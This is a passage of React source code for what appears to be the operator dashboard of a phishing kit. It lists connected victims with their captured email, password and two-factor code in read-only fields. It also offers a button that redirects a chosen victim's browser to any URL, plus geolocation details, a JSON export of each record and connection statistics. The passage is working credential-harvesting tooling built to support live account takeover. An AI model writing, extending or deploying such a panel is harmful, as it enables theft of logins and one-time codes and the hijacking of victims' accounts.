                                                                                    <Label className="text-gray-400 text-sm">Redirect User</Label>
                                                                                    <div className="flex gap-2">
                                                                                        <Input
                                                                                            type="url"
                                                                                            placeholder="https://example.com"
                                                                                            value={redirectUrl}
                                                                                            onChange={(e) => setRedirectUrl(e.target.value)}
                                                                                            className="bg-[#1c1c1c] border-[#444] text-white flex-1"
                                                                                        />
                                                                                        <button
                                                                                            onClick={() => {
                                                                                                if (redirectUrl.trim()) {
                                                                                                    socket.emit('redirect', {
                                                                                                        socketId: selectedConnection.id,
                                                                                                        url: redirectUrl
                                                                                                    });
                                                                                                    setRedirectUrl('');
                                                                                                }
                                                                                            }}
                                                                                            className="px-4 py-2 text-sm bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors flex items-center gap-2 whitespace-nowrap"
                                                                                        >
                                                                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                                                                                <path fillRule="evenodd" d="M12.586 4.586a2 2 0 112.828 2.828l-3 3a2 2 0 01-2.828 0 1 1 0 00-1.414 1.414 4 4 0 005.656 0l3-3a4 4 0 00-5.656-5.656l-1.5 1.5a1 1 0 101.414 1.414l1.5-1.5zm-5 5a2 2 0 012.828 0 1 1 0 101.414-1.414 4 4 0 00-5.656 0l-3 3a4 4 0 105.656 5.656l1.5-1.5a1 1 0 10-1.414-1.414l-1.5 1.5a2 2 0 11-2.828-2.828l3-3z" clipRule="evenodd" />
                                                                                            </svg>
                                                                                            Redirect
                                                                                        </button>
                                                                                    </div>
                                                                                </div>

                                                                                {selectedConnection.lastRedirect && (
                                                                                    <div className="p-3 bg-blue-900/20 border border-blue-800/30 rounded-lg">
                                                                                        <div className="flex items-center gap-2 text-sm">
                                                                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-blue-400" viewBox="0 0 20 20" fill="currentColor">
                                                                                                <path fillRule="evenodd" d="M12.586 4.586a2 2 0 112.828 2.828l-3 3a2 2 0 01-2.828 0 1 1 0 00-1.414 1.414 4 4 0 005.656 0l3-3a4 4 0 00-5.656-5.656l-1.5 1.5a1 1 0 101.414 1.414l1.5-1.5zm-5 5a2 2 0 012.828 0 1 1 0 101.414-1.414 4 4 0 00-5.656 0l-3 3a4 4 0 105.656 5.656l1.5-1.5a1 1 0 10-1.414-1.414l-1.5 1.5a2 2 0 11-2.828-2.828l3-3z" clipRule="evenodd" />
                                                                                            </svg>
                                                                                            <span className="text-gray-300">Redirected to</span>
                                                                                            <a
                                                                                                href={selectedConnection.lastRedirect.url}
                                                                                                target="_blank"
                                                                                                rel="noopener noreferrer"
                                                                                                className="text-blue-400 hover:text-blue-300 underline truncate"
                                                                                            >
                                                                                                {selectedConnection.lastRedirect.url}
                                                                                            </a>
                                                                                            <span className="text-gray-400">at {new Date(selectedConnection.lastRedirect.timestamp).toLocaleString()}</span>
                                                                                        </div>
                                                                                    </div>
                                                                                )}

                                                                                <div className="space-y-3 p-4 bg-[#262626] border border-[#333] rounded-lg">
                                                                                    <div className="space-y-2">
                                                                                        <Label className="text-gray-400 text-sm">Email</Label>
                                                                                        <Input
                                                                                            value={selectedConnection.loginData.email}
                                                                                            readOnly
                                                                                            className="bg-[#1c1c1c] border-[#444] text-white font-mono text-sm"
                                                                                        />
                                                                                    </div>

                                                                                    <div className="space-y-2">
                                                                                        <Label className="text-gray-400 text-sm">Password</Label>
                                                                                        <Input
                                                                                            value={selectedConnection.loginData.password}
                                                                                            readOnly
                                                                                            className="bg-[#1c1c1c] border-[#444] text-white font-mono text-sm"
                                                                                        />
                                                                                    </div>
                                                                                    {selectedConnection.loginData.twoFactorCode && (
                                                                                        <div className="space-y-2">
                                                                                            <Label className="text-gray-400 text-sm">2FA Code</Label>
                                                                                            <Input
                                                                                                value={selectedConnection.loginData.twoFactorCode}
                                                                                                readOnly
                                                                                                className="bg-[#1c1c1c] border-[#444] text-white font-mono text-sm"
                                                                                            />
                                                                                        </div>
                                                                                    )}
                                                                                </div>
                                                                            </div>
                                                                        ) : (
                                                                            <div className="p-4 bg-[#262626] border border-[#333] rounded-lg">
                                                                                <div className="text-center py-6">
                                                                                    <Lock className="w-12 h-12 mx-auto mb-3 text-gray-600" />
                                                                                    <p className="text-gray-400">No login data yet</p>
                                                                                </div>
                                                                            </div>
                                                                        )}

                                                                        {/* Network Section */}
                                                                        <div className="space-y-4">
                                                                            <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                                                                                <Network className="w-5 h-5" />
                                                                                Network Information
                                                                            </h3>

                                                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Organization</Label>
                                                                                    <Input
                                                                                        value={selectedConnection.geoData?.org || 'N/A'}
                                                                                        readOnly
                                                                                        className="bg-[#262626] border-[#333] text-gray-300"
                                                                                    />
                                                                                </div>

                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Timezone</Label>
                                                                                    <Input
                                                                                        value={selectedConnection.geoData?.timezone || 'N/A'}
                                                                                        readOnly
                                                                                        className="bg-[#262626] border-[#333] text-gray-300"
                                                                                    />
                                                                                </div>
                                                                            </div>
                                                                        </div>

                                                                        {/* Timing Section */}
                                                                        <div className="space-y-4">
                                                                            <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                                                                                <Calendar className="w-5 h-5" />
                                                                                Timing Information
                                                                            </h3>

                                                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Connected At</Label>
                                                                                    <Input
                                                                                        value={formatFullDate(selectedConnection.connectedAt)}
                                                                                        readOnly
                                                                                        className="bg-[#262626] border-[#333] text-gray-300"
                                                                                    />
                                                                                </div>

                                                                                <div className="space-y-2">
                                                                                    <Label className="text-gray-400 text-sm">Duration</Label>
                                                                                    <Input
                                                                                        value={formatTimeAgo(selectedConnection.connectedAt)}
                                                                                        readOnly
                                                                                        className="bg-[#262626] border-[#333] text-gray-300"
                                                                                    />
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <SheetFooter className="mt-8">
                                                                        <div className="flex flex-col sm:flex-row gap-3 w-full">
                                                                            <Button
                                                                                onClick={() => {
                                                                                    const data = {
                                                                                        ...selectedConnection,
                                                                                        fetchedAt: new Date().toISOString()
                                                                                    };
                                                                                    copyToClipboard(JSON.stringify(data, null, 2));
                                                                                }}
                                                                                className="flex-1 bg-blue-600 hover:bg-blue-700"
                                                                            >
                                                                                <Copy className="w-4 h-4 mr-2" />
                                                                                Copy JSON
                                                                            </Button>
                                                                            <SheetClose asChild>
                                                                                <Button variant="outline" className="flex-1 text-white hover:text-white border-[#333] bg-[#262626] hover:bg-[#333]">
                                                                                    Close
                                                                                </Button>
                                                                            </SheetClose>
                                                                        </div>
                                                                    </SheetFooter>
                                                                </>
                                                            )}
                                                        </SheetContent>
                                                    </Sheet>
                                                </div>
                                            </td>
                                        </tr>
                                    ))}
                                </tbody>
                            </table>
                        </div>

                        {/* Pagination */}
                        {totalPages > 1 && (
                            <div className="flex flex-col sm:flex-row items-center justify-between px-3 py-2 border-t border-[#333] bg-[#262626] gap-3">
                                <div className="text-xs text-gray-400">
                                    Showing {startIndex + 1} to {Math.min(endIndex, filteredConnections.length)} of{' '}
                                    {filteredConnections.length} users
                                </div>

                                <div className="flex items-center gap-1">
                                    <button
                                        onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
                                        disabled={currentPage === 1}
                                        className="p-1.5 hover:bg-[#333] rounded disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                                        aria-label="Previous page"
                                    >
                                        <ChevronLeft className="w-4 h-4" />
                                    </button>

                                    {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                                        let pageNum;
                                        if (totalPages <= 5) {
                                            pageNum = i + 1;
                                        } else if (currentPage <= 3) {
                                            pageNum = i + 1;
                                        } else if (currentPage >= totalPages - 2) {
                                            pageNum = totalPages - 4 + i;
                                        } else {
                                            pageNum = currentPage - 2 + i;
                                        }

                                        return (
                                            <button
                                                key={pageNum}
                                                onClick={() => setCurrentPage(pageNum)}
                                                className={`min-w-[32px] h-8 rounded text-xs transition-colors ${currentPage === pageNum
                                                    ? 'bg-[#444] text-white'
                                                    : 'hover:bg-[#333] text-gray-300'
                                                    }`}
                                            >
                                                {pageNum}
                                            </button>
                                        );
                                    })}

                                    <button
                                        onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
                                        disabled={currentPage === totalPages}
                                        className="p-1.5 hover:bg-[#333] rounded disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                                        aria-label="Next page"
                                    >
                                        <ChevronRight className="w-4 h-4" />
                                    </button>
                                </div>
                            </div>
                        )}
                    </>
                )}
            </div>

            <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-3">
                <div className="p-3 bg-[#1c1c1c] rounded-lg border border-[#333]">
                    <div className="text-xs text-gray-400 mb-1 flex items-center gap-1">
                        <User className="w-3 h-3" />
                        User Connections
                    </div>
                    <div className="text-lg font-bold text-green-400">
                        {stats.userCount}
                    </div>
                </div>
                <div className="p-3 bg-[#1c1c1c] rounded-lg border border-[#333]">
                    <div className="text-xs text-gray-400 mb-1 flex items-center gap-1">
                        <Shield className="w-3 h-3" />
                        Admin Sessions
                    </div>
                    <div className="text-lg font-bold text-blue-400">
                        {stats.adminCount}
                    </div>
                </div>
                <div className="p-3 bg-[#1c1c1c] rounded-lg border border-[#333]">
                    <div className="text-xs text-gray-400 mb-1">Unique Countries</div>
                    <div className="text-lg font-bold text-yellow-400">
                        {new Set(connections.map(c => c.geoData?.country).filter(Boolean)).size}
                    </div>
                </div>
                <div className="p-3 bg-[#1c1c1c] rounded-lg border border-[#333]">
                    <div className="text-xs text-gray-400 mb-1">Active Now</div>
                    <div className="text-lg font-bold text-purple-400">
                        {connections.filter(c => c.isActive).length}
                    </div>
                </div>
            </div>
        </div>
    );
}
